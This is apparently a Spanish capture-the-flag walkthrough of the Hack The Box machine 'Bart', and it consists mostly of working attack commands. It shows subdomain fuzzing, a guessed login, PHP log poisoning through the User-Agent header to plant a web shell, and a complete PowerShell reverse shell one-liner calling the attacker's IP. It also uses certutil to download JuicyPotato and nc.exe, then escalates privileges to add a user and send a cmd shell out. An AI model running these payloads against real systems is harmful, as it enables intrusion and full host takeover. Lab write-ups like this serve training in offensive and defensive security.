# 10.10.10.81 - Bart
--------------------

Puertos abiertos 80(http):
```console
└─$ whatweb http://10.10.10.81
HTTPServer[Microsoft-IIS/10.0], PHP[7.1.7], RedirectLocation[http://forum.bart.htb/], X-Powered-By[PHP/7.1.7]
ERROR Opening: http://forum.bart.htb/ - no address for forum.bart.htb
```
Ya el reconocimiento nos dice que hay dos subdominios interesantes:

```console
└─$ whatweb http://forum.bart.htb/
Email[d.simmons@bart.htb,h.potter@bart.htb,info@bart.htb,r.hilton@bart.htb,s.brown@bart.loca,s.brown@bart.local], HTML5, HTTPServer[Microsoft-IIS/10.0], JQuery, MetaGenerator[WordPress 4.8.2], Microsoft-IIS[10.0]

└─$ wfuzz -t 200 --hw=5628 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://bart.htb/FUZZ/
000000054:   200        548 L    2412 W     35529 Ch    "forum"
└─$ wfuzz -t 200 --hw=5628 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://bart.htb/FUZZ.php
000000002:   302        0 L      0 W        0 Ch        "index"
```

Si entramos en /forum nos da error
Forum.bart nos da al mismo sitio.

```console
└─$ wfuzz -c --hw=0 -w $(locate subdomains-top1million-5000.txt) -H "Host: FUZZ.bart.htb" -u http://bart.htb/ -t 100

000000023:   200        548 L    2412 W     35529 Ch    "forum"
000000099:   200        80 L     221 W      3423 Ch     "monitor"
```

Nos dan un panel de login. 

/POST a http://monitor.bart.htb/
{"csrf":"9cc6a04531b9c32001c04abc517839b1ddd6b040190b2daf8e81e49ec5bd3de8","user_name":"admin","user_password":"admin","action":"login"}

Por ser php intento bypasearlo con cosas como password=true (type juggling)

```console
└─$ wfuzz -t 200 --hw=12 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://monitor.bart.htb/FUZZ.php
000000002:   200        80 L     221 W      3423 Ch     "index"
000000702:   200        90 L     283 W      3714 Ch     "install"
000001477:   200        0 L      0 W        0 Ch        "config"
└─$ wfuzz -t 200 --hw=12 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://monitor.bart.htb/FUZZ/
000000256:   200        7 L      10 W       140 Ch      "static"
000000770:   200        7 L      10 W       140 Ch      "src"
000002410:   200        7 L      10 W       140 Ch      "cron"
```

install.php nos resuelve a una web que dice de instalar el programa, bajo ```/install.php?action=``` se efectuan
acciones como "install" o "config" (fuzee pero no hay mas)

La parte de forgot password nos pide un "nombre"

En la web de bart salian los nombres de tres personas:
```
└─$ curl -s http://bart.htb/forum/ | grep -E "name|mail" | tr -d "\n" > users.txt
```
```
Samantha Brown -> s.brown@bart.local
Daniel Simmons -> d.simmons@bart.htb  -> existe
Robert Hilton -> r.hilton@bart.htb
Harvey Potter -> h.potter@bart.htb    -> existe
```
En la parte de login como contraseña pruebo antes de hacer fuzzing, tanto "bart" como los apellidos de los 
usaurios. Resuelve el nombre "harvey" con la contraseña "potter".


En /servers sale un nuevo dominio ```internal-01.bart.htb```

Nos volvemos a topar con otro panel de login

/login.php -> "uname":"test","passwd":"test","submit":"Login"
```console
└─$ curl -X POST -s "http://internal-01.bart.htb/simple_chat/login.php" -d "uname=test&passwd=test&submit=Login"
# Nada
```
```console
└─$ wfuzz -t 200 --hw=12 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt "http://internal-01.bart.htb/simple_chat/FUZZ.php"
000000001:   302        0 L      0 W        0 Ch        "index"
000000051:   302        0 L      0 W        0 Ch        "register"
000000039:   302        0 L      0 W        0 Ch        "login"
000000324:   302        2 L      0 W        4 Ch        "chat"
000001144:   302        0 L      0 W        0 Ch        "logout"

└─$ curl -s "http://internal-01.bart.htb/simple_chat/register.php" -d "uname=cucuxii&passwd=cucuxii123"
# EN el navegador da error pero aquí funciona.
```

Al poner las creds otra vez en el panel de registro, "cucuxii" "cucuxii123" entramos.
En network salen peticiones /POST a "/simple-chat/chat.php"
```@harvey: DUDE! Do not place development code in here, this is a production server!```
Posibles inyecciones de todo tipo no funionan "<script>alert(1)</script>", "{{7*7}}"

La peticion es:
```console
└─$ curl -s http://internal-01.bart.htb/ -H "Cookie: PHPSESSID=npju0k7b5bireh5g8gld8frtsb" > main.js
# http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey
```
```
http://internal-01.bart.htb/log/log.php?filename=C:\Windows\System32\Drivers\etc\hosts&username=daniel # permision denied
http://internal-01.bart.htb/log/log.php?filename=log.txt&username=daniell -> 0
http://internal-01.bart.htb/log/log.php?filename=log.txt&username=daniel -> 1
```
```console
└─$ curl -s 'http://internal-01.bart.htb/log/log.php?filename=log.php&username=daniel'
└─$ curl -s 'http://internal-01.bart.htb/log/log.php?filename=test.php&username=daniel'
1[2022-12-20 11:34:03] - daniel - curl/7.84.0
└─$ curl -s 'http://internal-01.bart.htb/log/test.php'
[2022-12-20 11:34:19] - daniel - curl/7.84.0  

└─$ curl -s 'http://internal-01.bart.htb/log/log.php?filename=test.php&username=daniel' \
> -H 'User-Agent: <?php system("whoami")?>'
└─$ curl -s 'http://internal-01.bart.htb/log/test.php'
[2022-12-20 11:34:19] - daniel - curl/7.84.0[2022-12-20 11:37:07] - daniel - curl/7.84.0[2022-12-20 11:37:40] - daniel - nt authority\iusr

└─$ curl -s 'http://internal-01.bart.htb/log/log.php?filename=testt.php&username=daniel' -H 'User-Agent: <?php system($_REQUEST['cmd']); ?>'
└─$ curl -s 'http://internal-01.bart.htb/log/testt.php?cmd=whoami'
[2022-12-20 11:46:09] - daniel - nt authority\iusr

└─$ curl -s "http://internal-01.bart.htb/log/testt.php?cmd=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.14.16%27%2C666%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"
```

Esta es la version urlencodeada de la reverse shell de una sola linea:
```
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('1.1.1.1',666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```


```console
PS C:\Windows\Temp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```

JuicyPotato.exe


PS C:\Windows\Temp\Prueba> certutil.exe -f -urlcache -split http://10.10.14.16/JP.exe
PS C:\Windows\Temp\Prueba> ./JP.exe -t * -l 6666 -p C:\Windows\System32\cmd.exe -a "/c net user cucuxii cucuxii123 /add" # error

PS C:\Windows\Temp\Prueba> ./JP.exe -t * -l 6666 -p C:\Windows\System32\cmd.exe -a "/c net user cucuxii cucuxii123 /add" -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}"

PS C:\Windows\Temp\Prueba> certutil.exe -f -urlcache -split http://10.10.14.16/nc.exe

PS C:\Windows\Temp\Prueba> ./JP.exe -t * -l 6666 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\Prueba\nc.exe -e cmd 10.10.14.16 443" -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}"

└─$ sudo nc -nlvp 443
C:\Windows\system32>whoami


C:\Users>cmd /c dir /r /s user.txt # Directory of C:\Users\h.potter\Desktop

